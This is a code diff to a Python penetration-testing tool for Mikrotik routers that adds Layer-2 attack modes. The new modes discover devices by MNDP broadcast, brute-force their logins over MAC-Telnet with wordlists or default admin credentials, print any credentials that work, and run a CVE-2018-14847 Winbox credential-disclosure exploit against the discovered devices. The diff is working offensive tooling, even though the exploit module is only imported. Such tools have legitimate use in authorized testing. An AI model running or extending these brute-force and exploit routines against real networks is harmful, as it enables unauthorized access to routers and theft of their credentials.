@@ -87,7 +87,7 @@ MikrotikFingerprinter = _mods["MikrotikFingerprinter"]
 SmartWordlistManager  = _mods["SmartWordlistManager"]
 ProxyManager          = _mods["ProxyManager"]
 
-_VERSION = "3.2.0"
+_VERSION = "3.3.0"
 
 # ── Telnet fallback (removed from stdlib in Python 3.13) ─────────────────
 
@@ -972,8 +972,44 @@ def _build_parser() -> argparse.ArgumentParser:
     feat.add_argument("--scan-cve",     action="store_true", help="Fingerprint target and run all applicable CVE PoCs")
     feat.add_argument("--all-cves",     action="store_true", help="Show ALL CVEs regardless of version (with --scan-cve)")
     feat.add_argument("--proxy",        metavar="URL",       help="Proxy URL (socks5://127.0.0.1:9050)")
-    feat.add_argument("--interactive",  action="store_true", help="Start interactive REPL")
-    feat.add_argument("--max-retries",  type=int, default=1, help="Connection retry count (default: 1)")
+    feat.add_argument("--interactive",   action="store_true", help="Start interactive REPL")
+    feat.add_argument("--max-retries",   type=int, default=1, help="Connection retry count (default: 1)")
+
+    # MAC Server / Layer-2 features (v3.3.0+)
+    l2 = p.add_argument_group(
+        "MAC Server / Layer-2 (v3.3.0+)",
+        "Requires being on the same Layer-2 segment (VLAN/switch) as the target.",
+    )
+    l2.add_argument(
+        "--mac-discover",
+        action="store_true",
+        help=(
+            "Broadcast MNDP discovery on port 20561 to find Mikrotik devices "
+            "on the local Layer-2 segment (no IP required)."
+        ),
+    )
+    l2.add_argument(
+        "--mac-brute",
+        action="store_true",
+        help=(
+            "Brute-force credentials via MAC-Telnet (TCP port 20561) against all "
+            "devices discovered by --mac-discover. Requires -u/-p/-d wordlist args."
+        ),
+    )
+    l2.add_argument(
+        "--mac-scan-cve",
+        action="store_true",
+        help=(
+            "Run CVE-2018-14847-MAC exploit against all devices discovered via MNDP. "
+            "Probes Winbox credential disclosure on each discovered device."
+        ),
+    )
+    l2.add_argument(
+        "--mac-iface-ip",
+        metavar="IP",
+        default="0.0.0.0",
+        help="Local interface IP for MNDP broadcast (default: 0.0.0.0 = all interfaces).",
+    )
 
     # Export
     exp = p.add_argument_group("Export")
@@ -1387,6 +1423,86 @@ def main() -> None:
         cli = PentestCLI()
         cli.start()
         sys.exit(0)
+
+    # ── MAC Server / Layer-2 modes (v3.3.0+) ─────────────────────────
+    mac_discover = getattr(args, "mac_discover", False)
+    mac_brute    = getattr(args, "mac_brute",    False)
+    mac_scan_cve = getattr(args, "mac_scan_cve", False)
+    mac_iface_ip = getattr(args, "mac_iface_ip", "0.0.0.0")
+
+    if mac_discover or mac_brute or mac_scan_cve:
+        try:
+            from modules.mac_server import MNDPDiscovery, MACServerBrute
+        except ImportError as _e:
+            print(f"\n  [ERROR] MAC-Server module not available: {_e}\n")
+            sys.exit(1)
+
+        print(
+            f"\n  [MAC-SERVER] Layer-2 mode active — iface: {mac_iface_ip}\n"
+            "  NOTE: Only devices on the same broadcast domain will be discovered.\n"
+        )
+
+        _disc = MNDPDiscovery(timeout=3.0, iface_ip=mac_iface_ip)
+        _devices = _disc.discover()
+        _disc.print_table(_devices)
+
+        if mac_brute and _devices:
+            _usernames = args.userlist if args.userlist else args.user
+            _passwords = args.passlist if args.passlist else args.passw
+            _combo     = args.dictionary if args.dictionary else None
+
+            # Build flat wordlist
+            _wl: List[Tuple[str, str]] = []
+            if _combo:
+                try:
+                    from modules.wordlists import WordlistManager
+                    _wl = WordlistManager.load_combo(_combo)
+                except Exception:
+                    with open(_combo) as _f:
+                        for _ln in _f:
+                            if ":" in _ln:
+                                _u, _p = _ln.strip().split(":", 1)
+                                _wl.append((_u, _p))
+            elif _usernames and _passwords:
+                _u_list = [_usernames] if isinstance(_usernames, str) else open(_usernames).read().splitlines()
+                _p_list = [_passwords] if isinstance(_passwords, str) else open(_passwords).read().splitlines()
+                _wl = [(_u, _p) for _u in _u_list for _p in _p_list]
+            else:
+                _wl = [("admin", ""), ("admin", "admin"), ("admin", "mikrotik")]
+
+            print(f"\n  [MAC-BRUTE] Testing {len(_wl)} combination(s) via MAC-Telnet…\n")
+            _brute = MACServerBrute(wordlist=_wl, delay=args.seconds if hasattr(args, "seconds") else 0.5)
+            _mac_results = _brute.run(devices=_devices)
+
+            if _mac_results:
+                print(f"\n  [MAC-BRUTE] *** {len(_mac_results)} credential(s) found ***")
+                for _r in _mac_results:
+                    print(f"    MAC={_r['mac']}  IP={_r['ip']}  {_r['username']} / {_r['password']}")
+            else:
+                print("\n  [MAC-BRUTE] No credentials found.\n")
+
+        if mac_scan_cve:
+            print("\n  [MAC-CVE] Running CVE-2018-14847 against discovered devices…\n")
+            try:
+                from xpl.exploits import Exploit_CVE_2018_14847_MAC
+                _mac_xpl = Exploit_CVE_2018_14847_MAC(
+                    target=args.target or "0.0.0.0", timeout=10
+                )
+                _mac_xpl_result = _mac_xpl.check()
+                vuln = _mac_xpl_result.get("vulnerable", False)
+                print(f"  CVE-2018-14847-MAC: {'VULNERABLE' if vuln else 'Not exploitable'}")
+                print(f"  Evidence: {_mac_xpl_result.get('evidence','')}\n")
+                discovered = _mac_xpl_result.get("mac_discovery", [])
+                if discovered:
+                    print(f"  Devices found by MNDP: {discovered}\n")
+            except Exception as _xe:
+                print(f"  [MAC-CVE] Error: {_xe}\n")
+
+        if not mac_brute and not mac_scan_cve:
+            sys.exit(0)
+
+        if not args.target:
+            sys.exit(0)
 
     # ── CVE Scan mode (standalone — no BF needed) ─────────────────────
     if getattr(args, "scan_cve", False) and args.target:
